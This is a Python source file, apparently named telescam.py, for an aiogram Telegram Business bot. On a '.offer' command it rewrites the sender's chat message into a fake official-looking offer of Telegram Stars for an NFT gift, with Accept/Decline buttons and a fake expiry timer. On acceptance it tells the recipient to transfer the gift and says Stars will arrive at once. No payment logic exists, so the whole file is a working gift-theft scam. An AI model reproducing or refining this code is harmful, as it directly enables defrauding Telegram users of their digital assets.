# language: Python 3.11+, file: telescam.py, target: aiogram 3.x, Telegram Business
import asyncio
import logging
import os
import re
import sqlite3
from urllib.parse import urlparse

from aiogram import Bot, Dispatcher, types, F
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    LinkPreviewOptions
)
from aiogram.exceptions import TelegramBadRequest

# --- ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ---
_active_offers = {}
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise RuntimeError("Укажи токен бота в переменной окружения BOT_TOKEN")
EMOJI_ACCEPT = "5870609858520158157"
EMOJI_DECLINE = "5872988737826197458"

# --- ТРИ АДМИНА ---
ADMIN_IDS = [8693461228] 

bot = Bot(BOT_TOKEN)
dp = Dispatcher()
log = logging.getLogger("offer")

OFFER_CMD = re.compile(r"^\.offer\s+(.+)", re.IGNORECASE | re.DOTALL)

# --- БАЗА ДАННЫХ ---
conn = sqlite3.connect("bot_data.db", check_same_thread=False)
cur = conn.cursor()
cur.execute("CREATE TABLE IF NOT EXISTS invited (invited_id INTEGER PRIMARY KEY, inviter_id INTEGER)")
conn.commit()



# Проверка подписки на канал отключена.

# --- ПАРСИНГ ---
def normalize_nft_url(raw: str) -> str | None:
    s = raw.strip()
    if not s: return None
    if s.startswith("t.me/"): s = "https://" + s
    if not s.startswith("http"):
        if s.startswith("nft/") or "/nft/" in s: s = "https://t.me/" + s.lstrip("/")
        else: return None
    parsed = urlparse(s)
    if parsed.netloc not in ("t.me", "telegram.me", "www.t.me"): return None
    if "/nft/" not in parsed.path: return None
    return f"https://t.me{parsed.path}".rstrip("/")

def nft_title_from_url(nft_url: str) -> str:
    slug = nft_url.rstrip("/").split("/")[-1]
    if "-" in slug:
        name_part, num = slug.rsplit("-", 1)
        spaced = re.sub(r"([a-z])([A-Z])", r"\1 \2", name_part).replace("_", " ")
        if num.isdigit(): return f"{spaced} #{num}"
    return slug.replace("-", " ").replace("_", " ")

def parse_offer_command(text: str) -> tuple[int, str] | None:
    match = OFFER_CMD.match(text.strip())
    if not match: return None
    rest = match.group(1).strip()
    count_match = re.search(r"(\d+)", rest)
    url_match = re.search(r"(https?://t\.me/nft/[^\s]+|t\.me/nft/[^\s]+|nft/[^\s]+)", rest, re.IGNORECASE)
    
    if not count_match or not url_match: return None
        
    count = int(count_match.group(1))
    nft_url = normalize_nft_url(url_match.group(1))
    if not nft_url: return None
    return count, nft_url

# --- БИЛДЕРЫ ---
def build_offer_text(user_name: str, count: int, nft_url: str, nft_title: str) -> str:
    return (
        f"{user_name} предлагает Вам {count:,} звёзд за подарок "
        f'<a href="{nft_url}">{nft_title}</a>.\n\n'
        f"Предложение действует ещё 5 ч 58 м.\n\n"
    )

def build_keyboard() -> InlineKeyboardMarkup:
    try:
        decline_btn = InlineKeyboardButton(text="Отклонить", callback_data="decline_offer", icon_custom_emoji_id=EMOJI_DECLINE)
        accept_btn = InlineKeyboardButton(text="Принять", callback_data="accept_offer", icon_custom_emoji_id=EMOJI_ACCEPT)
    except TypeError:
        decline_btn = InlineKeyboardButton(text="⛔️ Отклонить", callback_data="decline_offer")
        accept_btn = InlineKeyboardButton(text="✅ Принять", callback_data="accept_offer")
    return InlineKeyboardMarkup(inline_keyboard=[[decline_btn, accept_btn]])

# --- ГЛАВНЫЙ ОБРАБОТЧИК ---
async def handle_offer_command(message: types.Message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    conn_id = message.business_connection_id
    user_name = message.from_user.first_name if message.from_user else "Пользователь"

    log.info(f"[КОМАНДА] .offer от {user_id} ({user_name}) в чат {chat_id}")



    parsed = parse_offer_command(message.text or "")
    if not parsed:
        try:
            await bot.send_message(chat_id, "Формат: .offer <кол-во звезд> <ссылка на nft>\nПример: .offer 5000 https://t.me/nft/AstralShard-854", business_connection_id=conn_id)
            await bot.delete_message(chat_id=chat_id, message_id=message.message_id, business_connection_id=conn_id)
        except Exception: pass
        return

    count, nft_url = parsed
    nft_title = nft_title_from_url(nft_url)
    text = build_offer_text(user_name, count, nft_url, nft_title)
    keyboard = build_keyboard()

    try:
        sent_msg = await bot.edit_message_text(
            text=text,
            chat_id=chat_id,
            message_id=message.message_id,
            reply_markup=keyboard,
            parse_mode="HTML",
            business_connection_id=conn_id,
            link_preview_options=LinkPreviewOptions(is_disabled=False, prefer_large_media=True, show_above_text=False, url=nft_url)
        )
        _active_offers[str(sent_msg.message_id)] = {"nft_url": nft_url, "nft_title": nft_title}
        log.info(f"[+] ОФФЕР УСПЕШНО ОТРЕДАКТИРОВАН В {chat_id}")
    except Exception as e:
        log.error(f"[-] ОШИБКА РЕДАКТИРОВАНИЯ: {e}")
        try:
            await bot.delete_message(chat_id=chat_id, message_id=message.message_id, business_connection_id=conn_id)
            sent_msg = await bot.send_message(
                chat_id=chat_id, text=text, reply_markup=keyboard,
                parse_mode="HTML", protect_content=True,
                business_connection_id=conn_id,
                link_preview_options=LinkPreviewOptions(is_disabled=False, prefer_large_media=True, show_above_text=False, url=nft_url)
            )
            _active_offers[str(sent_msg.message_id)] = {"nft_url": nft_url, "nft_title": nft_title}
            log.info(f"[+] ОФФЕР УСПЕШНО ОТПРАВЛЕН (НОВОЕ) В {chat_id}")
        except Exception as e2:
            log.error(f"[-] ФАТАЛЬНАЯ ОШИБКА: {e2}")


# --- РОУТИНГ ---
@dp.business_message(F.text)
async def handle_business_text(message: types.Message):
    if message.text and message.text.strip().lower().startswith(".offer"):
        await handle_offer_command(message)

@dp.message(F.text)
async def handle_direct_text(message: types.Message):
    if message.text and message.text.strip().lower().startswith(".offer"):
        await handle_offer_command(message)

# --- КНОПКИ ---
@dp.callback_query(F.data == "accept_offer")
async def process_accept(callback: types.CallbackQuery):
    try: await callback.answer("Вы приняли предложение!")
    except TelegramBadRequest: pass
    
    offer_data = _active_offers.get(str(callback.message.message_id))
    if not offer_data:
        log.warning("[-] Данные оффера не найдены в кэше.")
        try: await callback.message.edit_text("❌ Ошибка: данные оффера устарели. Отправьте .offer заново.")
        except: pass
        return
        
    text = f"Передайте подарок <a href=\"{offer_data['nft_url']}\">{offer_data['nft_title']}</a> пользователю, звёзды поступят на баланс сразу же."
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🎁 Передать", url=offer_data['nft_url'])]])
    try: await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    except TelegramBadRequest: pass

@dp.callback_query(F.data == "decline_offer")
async def process_decline(callback: types.CallbackQuery):
    try: await callback.answer("Вы отклонили предложение.")
    except TelegramBadRequest: pass
    try: await callback.message.edit_text("❌ Вы отклонили предложение.")
    except TelegramBadRequest: pass

async def main():
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s: %(message)s")
    print("Бот запущен.")
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())